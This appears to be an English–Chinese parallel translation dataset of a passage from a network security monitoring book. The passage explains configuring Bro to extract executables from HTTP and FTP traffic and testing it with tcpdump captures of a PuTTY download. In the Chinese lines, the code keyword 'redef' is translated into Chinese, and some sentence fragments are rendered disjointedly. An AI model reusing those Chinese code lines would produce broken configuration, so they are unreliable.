  id: totrans-1509
  prefs: []
  type: TYPE_NORMAL
  zh: 重定义 HTTP::extraction_prefix = "/nsm/bro/extracted/http/http-item";
- en: redef FTP::extraction_prefix = "/nsm/bro/extracted/ftp/ftp-file";
  id: totrans-1510
  prefs: []
  type: TYPE_NORMAL
  zh: 重定义 FTP::extraction_prefix = "/nsm/bro/extracted/ftp/ftp-file";
- en: '*Listing 12-4: Additions to the end of the* local .bro *file that enable Windows
    executable* *extraction for HTTP and FTP*'
  id: totrans-1511
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 12-4：在本地 .bro 文件的末尾添加内容，启用 Windows 可执行文件* *提取功能，适用于 HTTP 和 FTP*'
- en: If you wanted Bro to extract executables from Simple Mail Transfer
  id: totrans-1512
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你希望 Bro 从简单邮件传输协议（SMTP）中提取可执行文件，
- en: Protocol (SMTP) as well, you could add more lines similar to those in
  id: totrans-1513
  prefs: []
  type: TYPE_NORMAL
  zh: 协议（SMTP）也是如此，你可以添加类似于那些行的更多内容
- en: Listing 12-4, replacing HTTP with SMTP. Support for extracting binaries from
  id: totrans-1514
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 12-4，将 HTTP 替换为 SMTP。支持从
- en: Internet Relay Chat (IRC) is possible using the same method. To extract
  id: totrans-1515
  prefs: []
  type: TYPE_NORMAL
  zh: 使用相同的方法可以进行 Internet Relay Chat（IRC）。要提取
- en: more than Windows executables, you could alter u and v so that the
  id: totrans-1516
  prefs: []
  type: TYPE_NORMAL
  zh: 除了 Windows 可执行文件外，你还可以调整 u 和 v，使得
- en: 'application portions read as follows:'
  id: totrans-1517
  prefs: []
  type: TYPE_NORMAL
  zh: 应用程序部分读取如下内容：
- en: /application\/.*/;
  id: totrans-1518
  prefs: []
  type: TYPE_NORMAL
  zh: /application\/.*/;
- en: Replacing x-dosexec with .* tells Bro to extract any application type it
  id: totrans-1519
  prefs: []
  type: TYPE_NORMAL
  zh: 将 x-dosexec 替换为 .* 告诉 Bro 提取它能识别的任何应用程序类型
- en: recognizes. You should not run this sort of configuration in production
  id: totrans-1520
  prefs: []
  type: TYPE_NORMAL
  zh: 识别。你不应在生产环境中运行这种配置
- en: because you could overload your sensor as it tries to rebuild and write every-
  id: totrans-1521
  prefs: []
  type: TYPE_NORMAL
  zh: 因为你可能会使传感器过载，它会尝试重建并写入每个—
- en: thing Bro recognizes. Use /application\/.*/; only to process saved traces
  id: totrans-1522
  prefs: []
  type: TYPE_NORMAL
  zh: 这是 Bro 识别的内容。仅在处理保存的跟踪数据时使用 /application\/.*/;
- en: with limited amounts of traffic.
  id: totrans-1523
  prefs: []
  type: TYPE_NORMAL
  zh: 在有限的流量情况下。
- en: Now that we’ve altered Bro’s *local.bro* policy script, let’s test our new
  id: totrans-1524
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经修改了 Bro 的 *local.bro* 策略脚本，让我们测试一下新的
- en: functionality.
  id: totrans-1525
  prefs: []
  type: TYPE_NORMAL
  zh: 功能。
- en: '***Col ecting Traffic to Test Bro***'
  id: totrans-1526
  prefs: []
  type: TYPE_NORMAL
  zh: '***收集流量来测试 Bro***'
- en: When adding new capabilities to Bro and your SO installation, you should
  id: totrans-1527
  prefs: []
  type: TYPE_NORMAL
  zh: 当向 Bro 和你的 SO 安装添加新功能时，你应该
- en: test the changes manually before committing them. Bro allows you to run
  id: totrans-1528
  prefs: []
  type: TYPE_NORMAL
  zh: 在提交之前，手动测试这些更改。Bro 允许你运行
- en: policy scripts and other functionality against saved traffic, and we’ll do this
  id: totrans-1529
  prefs: []
  type: TYPE_NORMAL
  zh: 策略脚本和其他功能将基于保存的流量进行测试，我们将这样做
- en: to test its newly configured ability to extract binaries from packets.
  id: totrans-1530
  prefs: []
  type: TYPE_NORMAL
  zh: 测试它的新配置能力，从数据包中提取二进制文件。
- en: To provide the traffic for this test, we will download the Windows SSH
  id: totrans-1531
  prefs: []
  type: TYPE_NORMAL
  zh: 为了提供此测试的流量，我们将下载 Windows SSH
- en: client PuTTY via HTTP and FTP. The PuTTY website ( *http://www.chiark*
  id: totrans-1532
  prefs: []
  type: TYPE_NORMAL
  zh: 通过 HTTP 和 FTP 客户端 PuTTY。PuTTY 网站（ *http://www.chiark*
- en: '*.greenend.org.uk/~sgtatham/putty/download.html*) provides links for download-'
  id: totrans-1533
  prefs: []
  type: TYPE_NORMAL
  zh: '*.greenend.org.uk/~sgtatham/putty/download.html* 提供了下载链接'
- en: ing PuTTY via HTTP ( *http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe*)
    and FTP ( *ftp://ftp.chiark.greenend.org.uk/users/sgtatham/putty-latest/x86/putty*
  id: totrans-1534
  prefs: []
  type: TYPE_NORMAL
  zh: 通过 HTTP 下载 PuTTY（ *http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe*）和
    FTP（ *ftp://ftp.chiark.greenend.org.uk/users/sgtatham/putty-latest/x86/putty*）
- en: '*.exe*), giving us ways to test the capabilities we added to Bro. To save the
    traffic for the test, we will determine the IP addresses of the two servers hosting'
  id: totrans-1535
  prefs: []
  type: TYPE_NORMAL
  zh: '*.exe*），这为我们提供了测试 Bro 所添加功能的方法。为了保存测试流量，我们将确定托管的两个服务器的 IP 地址'
- en: '*putty .exe* via HTTP ( *the.earth.li*) and FTP ( *ftp.chiark.greenend.org.uk*),
    as shown in Listing 12-5, using the Linux host command in a terminal window.'
  id: totrans-1536
  prefs: []
  type: TYPE_NORMAL
  zh: '*putty .exe* 通过 HTTP（ *the.earth.li*）和 FTP（ *ftp.chiark.greenend.org.uk*），如列表
    12-5 所示，使用 Linux 主机命令在终端窗口中执行。'
- en: Extending SO **267**
  id: totrans-1537
  prefs: []
  type: TYPE_NORMAL
  zh: 扩展 SO **267**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1538
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 148](index-302_1.png)'
  id: totrans-1539
  prefs: []
  type: TYPE_IMG
  zh: '![Image 148](index-302_1.png)'
- en: $ **host the.earth.li**
  id: totrans-1540
  prefs: []
  type: TYPE_NORMAL
  zh: $ **host the.earth.li**
- en: the.earth.li has address 46.43.34.31u
  id: totrans-1541
  prefs: []
  type: TYPE_NORMAL
  zh: the.earth.li 的地址是 46.43.34.31u
- en: the.earth.li has IPv6 address 2001:41c8:10:b1f:c0ff:ee:15:900d
  id: totrans-1542
  prefs: []
  type: TYPE_NORMAL
  zh: the.earth.li 的 IPv6 地址是 2001:41c8:10:b1f:c0ff:ee:15:900d
- en: the.earth.li mail is handled by 10 mail.the.earth.li.
  id: totrans-1543
  prefs: []
  type: TYPE_NORMAL
  zh: the.earth.li 邮件由 10 mail.the.earth.li 处理。
- en: $ **host ftp.chiark.greenend.org.uk**
  id: totrans-1544
  prefs: []
  type: TYPE_NORMAL
  zh: $ **host ftp.chiark.greenend.org.uk**
- en: ftp.chiark.greenend.org.uk is an alias for service-name.chiark.greenend.org.
  id: totrans-1545
  prefs: []
  type: TYPE_NORMAL
  zh: ftp.chiark.greenend.org.uk 是 service-name.chiark.greenend.org 的别名。
- en: uk.
  id: totrans-1546
  prefs: []
  type: TYPE_NORMAL
  zh: uk。
- en: service-name.chiark.greenend.org.uk has address 212.13.197.229v
  id: totrans-1547
  prefs: []
  type: TYPE_NORMAL
  zh: service-name.chiark.greenend.org.uk 的地址是 212.13.197.229v
- en: service-name.chiark.greenend.org.uk mail is handled by 0 .
  id: totrans-1548
  prefs: []
  type: TYPE_NORMAL
  zh: service-name.chiark.greenend.org.uk 邮件由 0 处理。
- en: '*Listing 12-5: Determining the IP addresses for HTTP and FTP download servers*'
  id: totrans-1549
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 12-5：确定 HTTP 和 FTP 下载服务器的 IP 地址*'
- en: 'Next, we run two instances of Tcpdump: one configured to log traffic'
  id: totrans-1550
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们运行两个 Tcpdump 实例：一个配置为记录流量
- en: to and from the HTTP server at 46.43.34.31 u, and another to log traffic to
  id: totrans-1551
  prefs: []
  type: TYPE_NORMAL
  zh: 监控与位于46.43.34.31的HTTP服务器之间的流量，另一个用于记录与
- en: and from the FTP server at 212.13.197.229 v. Be sure to run the first com-
  id: totrans-1552
  prefs: []
  type: TYPE_NORMAL
  zh: 和位于212.13.197.229的FTP服务器之间的流量。确保先运行第一个命令：
- en: 'mand in one terminal, for the HTTP traffic:'
  id: totrans-1553
  prefs: []
  type: TYPE_NORMAL
  zh: 在一个终端中运行命令，监控HTTP流量：
- en: $ **sudo tcpdump -n -i eth0 -w http-putty.pcap -s 0 host 46.43.34.31**
  id: totrans-1554
  prefs: []
  type: TYPE_NORMAL
  zh: $ **sudo tcpdump -n -i eth0 -w http-putty.pcap -s 0 host 46.43.34.31**
- en: 'Run the second command in another terminal, for the FTP traffic:'
  id: totrans-1555
  prefs: []
  type: TYPE_NORMAL
  zh: 在另一个终端中运行第二个命令，监控FTP流量：
- en: $ **sudo tcpdump -n -i eth0 -w ftp-putty.pcap -s 0 host 212.13.197.229**
  id: totrans-1556
  prefs: []
  type: TYPE_NORMAL
  zh: $ **sudo tcpdump -n -i eth0 -w ftp-putty.pcap -s 0 host 212.13.197.229**
